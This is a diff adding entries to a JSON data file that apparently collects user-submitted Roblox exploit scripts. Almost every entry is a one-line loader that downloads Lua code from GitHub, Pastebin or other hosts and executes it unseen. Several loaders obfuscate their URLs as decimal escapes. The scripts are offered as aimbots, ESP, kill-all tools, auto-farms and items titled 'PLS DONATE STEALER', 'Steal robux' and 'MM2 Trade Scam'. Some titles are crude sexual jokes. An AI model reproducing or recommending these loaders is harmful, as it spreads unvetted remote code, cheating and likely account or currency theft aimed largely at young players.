@@ -20239,6 +20239,638 @@
       "Script_Title": "sus🤫🤫",
       "User_ID": 4764400704,
       "Username": "jackcole12po"
+    },
+    "Script2817": {
+      "Date": "December 15 2024",
+      "Description": "it doesn't work",
+      "Script": "loadstring(game:HttpGet(\"https://proxi-hub.com/flicker.lua\"))();",
+      "Script_Title": "don't work",
+      "User_ID": 7657605354,
+      "Username": "urlocalexp_loiter"
+    },
+    "Script2818": {
+      "Date": "December 15 2024",
+      "Description": "auto Farm",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Blox-Fruits-OP-HUB-AUTO-FARM-INSANE-MONEY-QUESTS-AND-MORE-19928\"))()",
+      "Script_Title": "blox fruits script",
+      "User_ID": 3123814256,
+      "Username": "negodopaio"
+    },
+    "Script2819": {
+      "Date": "December 14 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua\",true))()",
+      "Script_Title": "idk",
+      "User_ID": 7677409312,
+      "Username": "nnnnnnn999666"
+    },
+    "Script2820": {
+      "Date": "December 14 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/gclich/GHUBV13S/main/GHUBv13S.txt\"))()",
+      "Script_Title": "nnn",
+      "User_ID": 7677409312,
+      "Username": "nnnnnnn999666"
+    },
+    "Script2821": {
+      "Date": "December 15 2024",
+      "Description": "Doors Script Item OP work for JJslopit and Solara and more",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/CatEnddroid/Kitty-Cats-Doors-Beta/refs/heads/main/hub.lua\"))()",
+      "Script_Title": "Doors Item script",
+      "User_ID": 2538211046,
+      "Username": "Pae0550"
+    },
+    "Script2822": {
+      "Date": "December 15 2024",
+      "Description": "loopkill, freecam, kill all, 😗😲",
+      "Script": "loadstring(game:HttpGet(('https://raw.githubusercontent.com/Dan41/Scripts/main/%5BCHAOS%5D%20CHAOTIC%20HUB.lua'),true))()",
+      "Script_Title": "chaos script",
+      "User_ID": 3447744059,
+      "Username": "ayo_eww"
+    },
+    "Script2823": {
+      "Date": "December 15 2024",
+      "Description": "Handjob is a good thing.",
+      "Script": "loadstring(game:HttpGet(\"https://pastefy.app/wa3v2Vgm/raw\"))(\"Spider Script\")",
+      "Script_Title": "Handjob",
+      "User_ID": 7703145442,
+      "Username": "TestingBypassPaid"
+    },
+    "Script2824": {
+      "Date": "December 15 2024",
+      "Description": "Here use my script free Follow me in roblox name:b0ssjkl0666",
+      "Script": "loadstring(game:HttpGet(('https://pastebin.com/raw/9QyWJ5n1'),true))()",
+      "Script_Title": "B0ssjkl0666MySCRIPT",
+      "User_ID": 4321575771,
+      "Username": "shewithepanda"
+    },
+    "Script2825": {
+      "Date": "December 15 2024",
+      "Description": "script copy avatar universal funciona 99%",
+      "Script": "--[[\n\tWARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!\n]]\nloadstring(\"\\108\\111\\97\\100\\115\\116\\114\\105\\110\\103\\40\\103\\97\\109\\101\\58\\72\\116\\116\\112\\71\\101\\116\\40\\34\\104\\116\\116\\112\\115\\58\\47\\47\\114\\97\\119\\46\\103\\105\\116\\104\\117\\98\\117\\115\\101\\114\\99\\111\\110\\116\\101\\110\\116\\46\\99\\111\\109\\47\\73\\110\\118\\111\\111\\107\\101\\114\\49\\49\\47\\79\\117\\116\\102\\105\\116\\47\\109\\97\\105\\110\\47\\79\\117\\116\\102\\105\\116\\67\\111\\112\\105\\101\\114\\46\\108\\117\\97\\34\\44\\32\\116\\114\\117\\101\\41\\41\\40\\41\\10\")()\n--requires group : https://www.roblox.com/groups/13022453/Hell-treet\n\n--requires group : https://www.roblox.com/groups/13022453/Hell-treet\n\n--requires group : https://www.roblox.com/groups/13022453/Hell-treet\n\n--requires group : https://www.roblox.com/groups/13022453/Hell-treet\n\n--requires group : https://www.roblox.com/groups/13022453/Hell-treet\n\n--requires group : https://www.roblox.com/groups/13022453/Hell-treet\n\n--requires group : https://www.roblox.com/groups/13022453/Hell-treet\n\n--requires group : https://www.roblox.com/groups/13022453/Hell-treet\n\n--requires group : https://www.roblox.com/groups/13022453/Hell-treet\n\n",
+      "Script_Title": "copy avatar universa",
+      "User_ID": 5676772168,
+      "Username": "eieururi57"
+    },
+    "Script2826": {
+      "Date": "December 15 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()",
+      "Script_Title": "redz hub",
+      "User_ID": 7574490478,
+      "Username": "dough25358"
+    },
+    "Script2827": {
+      "Date": "December 15 2024",
+      "Description": "yes it dont workUSELESS its for slap battles",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/FISHING-Slap-Battles-op-script-idk-24463\"))()",
+      "Script_Title": "Slap battles yes",
+      "User_ID": 5738662621,
+      "Username": "aFz_noob095"
+    },
+    "Script2828": {
+      "Date": "December 15 2024",
+      "Description": "only works on hereos battlegrounds",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/WELPCASED/Hero-s-hub-work/main/Hero%E2%80%99s%20script\", true))()",
+      "Script_Title": "heros battlegrounds",
+      "User_ID": 7686723235,
+      "Username": "jdjsdjdjfn"
+    },
+    "Script2829": {
+      "Date": "December 15 2024",
+      "Description": "LDSHUB-IhXlg8y6VnAp25IdaoW This is the key🔐🔑😊Follow me in roblox name:b0ssjkl0666",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/SenhorLDS/ProjectLDSHUB/main/OfficialScript'))()",
+      "Script_Title": "Tower|Key in descrip",
+      "User_ID": 4321575771,
+      "Username": "shewithepanda"
+    },
+    "Script2830": {
+      "Date": "December 15 2024",
+      "Description": "👗Dress to impress (OP GUI)👗MAKE SURE TO FOLLOW ME IN ROBLOX NAMW:b0ssjkl0666😊💖",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Yumiara/Python/refs/heads/main/DTI.py\"))(); ",
+      "Script_Title": "Dress To impress Gui",
+      "User_ID": 4321575771,
+      "Username": "shewithepanda"
+    },
+    "Script2831": {
+      "Date": "December 15 2024",
+      "Description": "Thanks for using my script hope this is usefull😊(New Script Creator!)😘",
+      "Script": "loadstring(game:HttpGet(('https://raw.githubusercontent.com/debug42O/Ez-Industries-Launcher-Data/master/Launcher.lua'),true))()",
+      "Script_Title": "Ez|HubBy:b0ssjkl0666",
+      "User_ID": 4321575771,
+      "Username": "shewithepanda"
+    },
+    "Script2832": {
+      "Date": "December 15 2024",
+      "Description": "The strongest backround Gui(OP!)just click THE UP BUTTON!to see feauture Enjoy!🥰♥️!",
+      "Script": "loadstring(game:HttpGet(\"https://pastebin.com/raw/2MmEqN9c\"))()",
+      "Script_Title": "TheStrongestBackgrnd",
+      "User_ID": 4321575771,
+      "Username": "shewithepanda"
+    },
+    "Script2833": {
+      "Date": "December 15 2024",
+      "Description": "you can use my script (MEEPCITY)Maybe this is work in Tubers93CreationTHIS IS (OP)gui😎!",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/synolope/mpcity/main/loader.lua\",true))()",
+      "Script_Title": "Meepcity:b0ssjkl0666",
+      "User_ID": 4321575771,
+      "Username": "shewithepanda"
+    },
+    "Script2834": {
+      "Date": "December 15 2024",
+      "Description": "Credits:Baconboss on youtube",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/BaconBossScript/BeeconHub/main/BeeconHub\"))()\n",
+      "Script_Title": "Bacon hub 36+ games ",
+      "User_ID": 3713735286,
+      "Username": "Shizoid_Isanitartop"
+    },
+    "Script2835": {
+      "Date": "December 15 2024",
+      "Description": "Use my script now!🥰Follow me in roblox name: shewithepanda to play with me!😊b0ssjkl0",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Pendulum%20Hub%20V5.lua\"))()",
+      "Script_Title": "Its my Script:Jkl0",
+      "User_ID": 4321575771,
+      "Username": "shewithepanda"
+    },
+    "Script2836": {
+      "Date": "December 15 2024",
+      "Description": "Work At Pizza place Gui by: b0ssjkl0666😊You can use my script with autoFarm only|More?",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/oShyyyyy/iris-jhub/main/WorkAtpizzaplace'))()",
+      "Script_Title": "Work At Pizza place!",
+      "User_ID": 4321575771,
+      "Username": "shewithepanda"
+    },
+    "Script2837": {
+      "Date": "December 15 2024",
+      "Description": "wöwleö",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/MADNESSTEST/Pqoeirnfjw/main/AP3-5.lua\"))()",
+      "Script_Title": "ROBUX FOR FREE",
+      "User_ID": 2752475468,
+      "Username": "poyraz22112"
+    },
+    "Script2838": {
+      "Date": "December 15 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Blox-Fruits-OP-GUI-WITH-AUTOFARM-23948\"))()",
+      "Script_Title": "This is blox fruits",
+      "User_ID": 5738662621,
+      "Username": "aFz_noob095"
+    },
+    "Script2839": {
+      "Date": "December 15 2024",
+      "Description": "I tested on dragon update and it works",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua\", true))()",
+      "Script_Title": "Speed hub works new ",
+      "User_ID": 4871414055,
+      "Username": "Block_S3"
+    },
+    "Script2840": {
+      "Date": "December 15 2024",
+      "Description": "Furry infection",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Furry-Infection-game-Furinfection-Kill-Aura-Kill-All-And-More-20085\"))()",
+      "Script_Title": "LoL",
+      "User_ID": 3803597867,
+      "Username": "Piecmoch1"
+    },
+    "Script2841": {
+      "Date": "December 15 2024",
+      "Description": "Idc",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Furry-Infection-game-Furinfection-Kill-Aura-Kill-All-And-More-20085\"))()",
+      "Script_Title": "Furry Infection",
+      "User_ID": 3803597867,
+      "Username": "Piecmoch1"
+    },
+    "Script2842": {
+      "Date": "December 15 2024",
+      "Description": "from the dragon update",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua\", true))()",
+      "Script_Title": "Speed x hub",
+      "User_ID": 3014880053,
+      "Username": "aira_harlee"
+    },
+    "Script2843": {
+      "Date": "December 15 2024",
+      "Description": "U will have the most keyless scripts",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/scripthubekitten/SCRIPTHUBV3/main/SCRIPTHUBV3\", true))()",
+      "Script_Title": "Best script all game",
+      "User_ID": 7686590730,
+      "Username": "BecomeChillguy"
+    },
+    "Script2844": {
+      "Date": "December 15 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()",
+      "Script_Title": "swagmode",
+      "User_ID": 7093737426,
+      "Username": "TEAM_lPRO0"
+    },
+    "Script2845": {
+      "Date": "December 15 2024",
+      "Description": "",
+      "Script": "require(11560761226).HD(\"sknduawb\")",
+      "Script_Title": "Require",
+      "User_ID": 4545045587,
+      "Username": "sknduawb"
+    },
+    "Script2846": {
+      "Date": "December 15 2024",
+      "Description": "teletransporte tool",
+      "Script": "loadstring(game:HttpGet(\"https://scriptblox.com/raw/Universal-Script-Q-tool-tp-7709\"))()",
+      "Script_Title": "teletransporte tool",
+      "User_ID": 3909698407,
+      "Username": "Angel_fernando31"
+    },
+    "Script2847": {
+      "Date": "December 15 2024",
+      "Description": "idk",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/EnzoLeo127/Scripts/main/WICKEDRP\"))()",
+      "Script_Title": "wicked rp ugc",
+      "User_ID": 6090547666,
+      "Username": "TheUnknown01011"
+    },
+    "Script2848": {
+      "Date": "December 15 2024",
+      "Description": "Idk",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/EnzoLeo127/Scripts/main/WICKEDRP\"))()",
+      "Script_Title": "wicked rp",
+      "User_ID": 6090547666,
+      "Username": "TheUnknown01011"
+    },
+    "Script2849": {
+      "Date": "December 15 2024",
+      "Description": "ayo gng this is W script",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/SigmaSploiter1/Plasma-Scripts/refs/heads/main/SLS.txt\"))()",
+      "Script_Title": "super league soccer ",
+      "User_ID": 7700847067,
+      "Username": "imtakingshi"
+    },
+    "Script2850": {
+      "Date": "December 15 2024",
+      "Description": "this is from ghostplayer! ",
+      "Script": "loadstring(game:HttpGet('https://pastefy.app/S7xNJSXX/raw'))()execute(\"Script18\")",
+      "Script_Title": "Script avater change",
+      "User_ID": 2538211046,
+      "Username": "Pae0550"
+    },
+    "Script2851": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Dandy's-World-ALPHA-Hex233222-Hub-Update-22378\"))()",
+      "Script_Title": "Dandys world",
+      "User_ID": 1969930846,
+      "Username": "yolz21l"
+    },
+    "Script2852": {
+      "Date": "December 15 2024",
+      "Description": "dance",
+      "Script": "--- Keybind to open for pc is \"comma\" -> \" , \"\n-- Made by Gi#7331\n\nloadstring(game:HttpGet(\"https://pastebin.com/raw/eCpipCTH\"))()",
+      "Script_Title": "dance",
+      "User_ID": 2034671339,
+      "Username": "fares213u"
+    },
+    "Script2853": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Free-fe-animation-17111\"))()",
+      "Script_Title": "fe animation__",
+      "User_ID": 3354676898,
+      "Username": "YOUTUNBG"
+    },
+    "Script2854": {
+      "Date": "December 15 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Scripterxzx/PLS-DONATE/refs/heads/main/PLS%20DONATE%20STEALER'))()",
+      "Script_Title": "PLS DONATE STEALER",
+      "User_ID": 5098155203,
+      "Username": "SinnVamp"
+    },
+    "Script2855": {
+      "Date": "December 15 2024",
+      "Description": "script seacher thing",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-ECCS-Searcher-V27-22111\"))()",
+      "Script_Title": "eccs",
+      "User_ID": 7055179696,
+      "Username": "colinballin203"
+    },
+    "Script2856": {
+      "Date": "December 15 2024",
+      "Description": "blox fruit DRAGON UPDATE ",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua\", true))()",
+      "Script_Title": "blox fruit DRAGON UP",
+      "User_ID": 1543850484,
+      "Username": "Rob7u6yr4"
+    },
+    "Script2857": {
+      "Date": "December 15 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/yzeedw/Mortalv2-main/main/UNIVERSAL%20AIMBOT\"))()",
+      "Script_Title": "aimbot",
+      "User_ID": 7637807606,
+      "Username": "idieydhxidhd"
+    },
+    "Script2858": {
+      "Date": "December 15 2024",
+      "Description": "-- Made by axew on vermillion\nfor i,v in pairs (game.Workspace:GetChildren()) do\nif v.Name",
+      "Script": "-- Made by axew on vermillion\nfor i,v in pairs (game.Workspace:GetChildren()) do\nif v.Name == \"Nuke\" then\nv:Destroy()\nend\nend\nwait(1)\nlocal Tool = Instance.new(\"HopperBin\", game.Players.LocalPlayer.Backpack)\nTool.Name = \"Detonater\"\nlocal Mouse = game.Players.LocalPlayer:GetMouse()\n\nlocal Place = Instance.new(\"HopperBin\", game.Players.LocalPlayer.Backpack)\nPlace.Name = \"Placer\"\nNuke = Instance.new(\"Model\")\nNuke.Parent = game.Workspace\nNuke.Name = \"Nuke\"\n\nx5 = 1\nMouse.Button1Down:connect(function()\nif x5 == 1 then\nif Place.Active == true then\nlocal name = game.Players.LocalPlayer.Name\nlocal Part1 = Instance.new(\"Part\")\nPart1.Name = \"Part\"\nPart1.Parent = Nuke\nPart1.Size = Vector3.new(12,1,6)\nPart1.Position = Mouse.Hit.p\nPart1.BottomSurface = \"Smooth\"\nPart1.TopSurface = \"Smooth\"\nPart1.Material = \"Metal\"\nPart1.BrickColor = BrickColor.new(\"Really black\")\nPart1.Anchored = true\nlocal x1 = game.Workspace.Nuke.Part.Position.X\nlocal y1 = game.Workspace.Nuke.Part.Position.Y\nlocal z1 = game.Workspace.Nuke.Part.Position.Z\nlocal Part2 = Instance.new(\"Part\")\nPart2.Name = \"Detonate\"\nPart2.Parent = Nuke\nPart2.Size = Vector3.new(10, 5, 5)\nPart2.Position = Vector3.new(x1,y1+2,z1)\nPart2.BottomSurface = \"Smooth\"\nPart2.TopSurface = \"Smooth\"\nPart2.Material = \"Metal\"\nPart2.BrickColor = BrickColor.new(\"Really black\")\nPart2.Anchored = true\nPart2.Shape = \"Cylinder\"\nx5 = x5+1\nlocal Decal = Instance.new(\"Decal\")\nDecal.Texture = \"http://www.roblox.com/asset/?id=14301975\"\nDecal.Parent = Part2\nDecal.Face = \"Back\"\nend\nend\nend)\n\n\nMouse.Button1Down:connect(function()\nif Tool.Active == true then\nlocal nuke = Instance.new(\"Part\")\nnuke.Position = game.Workspace.Nuke.Detonate.Position\nnuke.Anchored = true\nnuke.Parent = game.Workspace\nlocal x, y, z = 5, 5, 5\nnuke.BrickColor = BrickColor.new (\"New Yeller\")\nnuke.Size = Vector3.new(x, y, z)\nnuke.CanCollide = false\nnuke.Name = \"nuke\"\nnuke.Shape = \"Ball\"\nnuke.Transparency = 0.3\nnuke.Material = \"Neon\"\nnuke.Locked = true\ngame.Workspace.Nuke:Destroy()\nwhile x <= 100 do\nx, y, z = x+1, y+1, z+1\nnuke.Size = Vector3.new(x, y, z)\nlocal explosion = Instance.new(\"Explosion\")\nexplosion.BlastPressure = 1000000\nexplosion.BlastRadius = x-15\nexplosion.DestroyJointRadiusPercent = 1\nexplosion.ExplosionType = \"Craters\"\nexplosion.Parent = game.Workspace\nexplosion.Position = game.Workspace.nuke.Position\nexplosion.Hit:connect(function(Part, Distance)\nif Part.Name ~= \"nuke\" then\nPart.Anchored = false\nPart:BreakJoints()\nend\nend)\nwait(0.01)\nend\nwhile x <= 200 do\nx, y, z = x+3, y+3, z+3\nnuke.Size = Vector3.new(x, y, z)\nlocal explosion = Instance.new(\"Explosion\")\nexplosion.BlastPressure = 1000000\nexplosion.BlastRadius = x+50\nexplosion.DestroyJointRadiusPercent = 1\nexplosion.ExplosionType = \"Craters\"\nexplosion.Parent = game.Workspace\nexplosion.Position = game.Workspace.nuke.Position\nexplosion.Hit:connect(function(Part, Distance)\nif Part.Name ~= \"nuke\" then\nPart.Anchored = false\nPart:BreakJoints()\nend\nend)\nwait(0.01)\nend\ngame.Workspace.nuke:Destroy()\nx5 = 1\nNuke = Instance.new(\"Model\")\nNuke.Parent = game.Workspace\nNuke.Name = \"Nuke\"\nTool.Active = false\nend\nend)",
+      "Script_Title": "lol",
+      "User_ID": 7623401406,
+      "Username": "kskwk571"
+    },
+    "Script2859": {
+      "Date": "December 15 2024",
+      "Description": "This is beta",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/cf27f931-b670-4767-b517-24d1896daaea_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "Pls Donate Auto Beg",
+      "User_ID": 1953207419,
+      "Username": "rorobob110"
+    },
+    "Script2860": {
+      "Date": "December 15 2024",
+      "Description": ":D",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/brosula123/CAMLOCK/main/SKIBIDI\"))()",
+      "Script_Title": "blox fruit aimbot",
+      "User_ID": 7057595357,
+      "Username": "ThaoNghivxke09767"
+    },
+    "Script2861": {
+      "Date": "December 15 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/tapboundcc/tapbound/main/camlock/by%20%23xvsfi'))()",
+      "Script_Title": "aimlock 2",
+      "User_ID": 7637807606,
+      "Username": "idieydhxidhd"
+    },
+    "Script2862": {
+      "Date": "December 15 2024",
+      "Description": "u can see all player and also npc",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubEsp\"))()",
+      "Script_Title": "esp pepole/npc",
+      "User_ID": 7051440186,
+      "Username": "ep2a1"
+    },
+    "Script2863": {
+      "Date": "December 15 2024",
+      "Description": ":D",
+      "Script": "_G.Aimbot = true\nloadstring(game:HttpGet(\"https://scripts.alchemyhub.xyz\"))()",
+      "Script_Title": "blox fruit aimbot v2",
+      "User_ID": 7057595357,
+      "Username": "ThaoNghivxke09767"
+    },
+    "Script2864": {
+      "Date": "December 15 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Scripterxzx/PLS-DONATE/refs/heads/main/PLS%20DONATE%20STEALER'))()",
+      "Script_Title": "PLS DONATE STEALER",
+      "User_ID": 1247813431,
+      "Username": "masonrobloxing"
+    },
+    "Script2865": {
+      "Date": "December 15 2024",
+      "Description": "reyb",
+      "Script": "loadstring(\"\\108\\111\\97\\100\\115\\116\\114\\105\\110\\103\\40\\103\\97\\109\\101\\58\\72\\116\\116\\112\\71\\101\\116\\40\\40\\39\\104\\116\\116\\112\\115\\58\\47\\47\\112\\97\\115\\116\\101\\102\\121\\46\\103\\97\\47\\84\\82\\52\\89\\105\\48\\88\\109\\47\\114\\97\\119\\39\\41\\44\\116\\114\\117\\101\\41\\41\\40\\41\\10\")()",
+      "Script_Title": "raro.",
+      "User_ID": 7530792782,
+      "Username": "darahudep"
+    },
+    "Script2866": {
+      "Date": "December 15 2024",
+      "Description": "Work",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/cf27f931-b670-4767-b517-24d1896daaea_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "Pls donate",
+      "User_ID": 40185128,
+      "Username": "rorobob110"
+    },
+    "Script2867": {
+      "Date": "December 15 2024",
+      "Description": "Only Work in pls donate vip is FE",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/cd278479-95da-4820-ae61-caa9fba50f3d_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "Pls Donate Free Vip",
+      "User_ID": 5474475295,
+      "Username": "Oskomaexe"
+    },
+    "Script2868": {
+      "Date": "December 15 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua\"))()",
+      "Script_Title": "redz",
+      "User_ID": 7643506870,
+      "Username": "Chorapragramatica"
+    },
+    "Script2869": {
+      "Date": "December 15 2024",
+      "Description": "it the best pls donate script",
+      "Script": "\nloadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/b8f0bd2293cb151c74ef0597.lua'))()",
+      "Script_Title": "pls donate ",
+      "User_ID": 7345018745,
+      "Username": "villian_JJ"
+    },
+    "Script2870": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua\", true))()",
+      "Script_Title": "BF Update 24",
+      "User_ID": 7446951003,
+      "Username": "AlfanR5"
+    },
+    "Script2871": {
+      "Date": "December 16 2024",
+      "Description": "Best Trade Scam Very Op",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/568b0907-1856-48ca-98d6-5ac0698f679a_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "MM2 Trade Scam",
+      "User_ID": 5474475295,
+      "Username": "Oskomaexe"
+    },
+    "Script2872": {
+      "Date": "December 15 2024",
+      "Description": "super ring",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Super-Ring-Parts-v3-by-Yumm-20047\"))()\n",
+      "Script_Title": "SUPER RING",
+      "User_ID": 5536084696,
+      "Username": "pou_pou784"
+    },
+    "Script2873": {
+      "Date": "December 16 2024",
+      "Description": "Script finds richest player on pls donate",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/b81744e4-ef7f-4093-9fcf-c6536c4b53ec_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "Pls Donate Find Rich",
+      "User_ID": 1302544728,
+      "Username": "tigerDan910"
+    },
+    "Script2874": {
+      "Date": "December 15 2024",
+      "Description": ":D",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-rochips-usefull-24163\"))()",
+      "Script_Title": "brookhaven",
+      "User_ID": 7057595357,
+      "Username": "ThaoNghivxke09767"
+    },
+    "Script2875": {
+      "Date": "December 16 2024",
+      "Description": "Steal robux",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/b81744e4-ef7f-4093-9fcf-c6536c4b53ec_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "Pls Donate Stealer",
+      "User_ID": 1302544728,
+      "Username": "tigerDan910"
+    },
+    "Script2876": {
+      "Date": "December 15 2024",
+      "Description": "Use strongest hero",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Kenjihin69/Kenjihin69/refs/heads/main/Tp%20exploit%20saitama%20to%20jun'))()",
+      "Script_Title": "Tsb jun",
+      "User_ID": 7472071232,
+      "Username": "Nethlogicdubmy"
+    },
+    "Script2877": {
+      "Date": "December 15 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua\", true))()",
+      "Script_Title": "blox fruits update\n",
+      "User_ID": 4600458627,
+      "Username": "Ax7_bielzin09"
+    },
+    "Script2878": {
+      "Date": "December 16 2024",
+      "Description": "سكربت هاذا لسه لازم يطور",
+      "Script": "loadstring(game:HttpGet(\"https://pastebin.com/raw/Lq04mZEb\"))()",
+      "Script_Title": "t00kill",
+      "User_ID": 7666453708,
+      "Username": "6X6X6_here"
+    },
+    "Script2879": {
+      "Date": "December 16 2024",
+      "Description": "this script new in bloxfruits speed has so op plss use this and thank you😜😜",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua\", true))()",
+      "Script_Title": "speed hub",
+      "User_ID": 4203899533,
+      "Username": "mhecogood"
+    },
+    "Script2880": {
+      "Date": "December 15 2024",
+      "Description": "jerk off",
+      "Script": "getgenv().JERK_OFF_SPEED = 2\n --// self explainatory, the speed of jerking off\ngetgenv().KEEP_ON_DEATH = true --// if true, gives you the jerk off tool when you respawn\n\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/Sakupenny/Universal-Jerk-Off/refs/heads/main/Main.lua\"))()",
+      "Script_Title": "jerk off",
+      "User_ID": 7654673534,
+      "Username": "7upaichul01998"
+    },
+    "Script2881": {
+      "Date": "December 15 2024",
+      "Description": "melhor do mundo ",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AstroXTeam/AstroXTeam/refs/heads/main/%D9%87%D9%84%D9%88.lua\"))({ \"https://t.me/+tuhsBmhYBT0wMzBi\",true,\"BY:nxDredd\" })",
+      "Script_Title": "HACK RRgg",
+      "User_ID": 1160607583,
+      "Username": "barchoau"
+    },
+    "Script2882": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua\"))()",
+      "Script_Title": "redz hub new",
+      "User_ID": 6034167843,
+      "Username": "DockDealer"
+    },
+    "Script2883": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/LuaCrack/Min/refs/heads/main/MinSeHub\"))()",
+      "Script_Title": "min hub",
+      "User_ID": 6034167843,
+      "Username": "DockDealer"
+    },
+    "Script2884": {
+      "Date": "December 15 2024",
+      "Description": "xd",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/ORG-hubb/ORG/main/ORG-Hub.lua\"))()",
+      "Script_Title": "loadstring(game:Http",
+      "User_ID": 3603500265,
+      "Username": "yukine8657"
+    },
+    "Script2885": {
+      "Date": "December 16 2024",
+      "Description": "speed hub keyless",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua\"))()",
+      "Script_Title": "bloxfruit dragon upd",
+      "User_ID": 2212059844,
+      "Username": "clint_icayan"
+    },
+    "Script2886": {
+      "Date": "December 16 2024",
+      "Description": "هاذا سكربت لي اخي العزيز",
+      "Script": "loadstring(game:HttpGet(\"https://pastebin.com/raw/zzjcr8FM\"))()",
+      "Script_Title": "pony hub",
+      "User_ID": 7666453708,
+      "Username": "6X6X6_here"
+    },
+    "Script2887": {
+      "Date": "December 16 2024",
+      "Description": "for arab",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/n0kc/AtomicHub/main/Map-Al-Biout.lua\"))()",
+      "Script_Title": "arab+sus",
+      "User_ID": 7503144841,
+      "Username": "4lilx_401"
+    },
+    "Script2888": {
+      "Date": "December 16 2024",
+      "Description": "gg",
+      "Script": "loadstring(game:HttpGet(\"\\104\\116\\116\\112\\115\\58\\47\\47\\114\\97\\119\\46\\103\\105\\116\\104\\117\\98\\117\\115\\101\\114\\99\\111\\110\\116\\101\\110\\116\\46\\99\\111\\109\\47\\110\\97\\105\\110\\115\\104\\117\\47\\110\\111\\47\\109\\97\\105\\110\\47\\65\\80\\84\\46\\108\\117\\97\"))()",
+      "Script_Title": "apt",
+      "User_ID": 7617784167,
+      "Username": "qazplm5596123"
+    },
+    "Script2889": {
+      "Date": "December 16 2024",
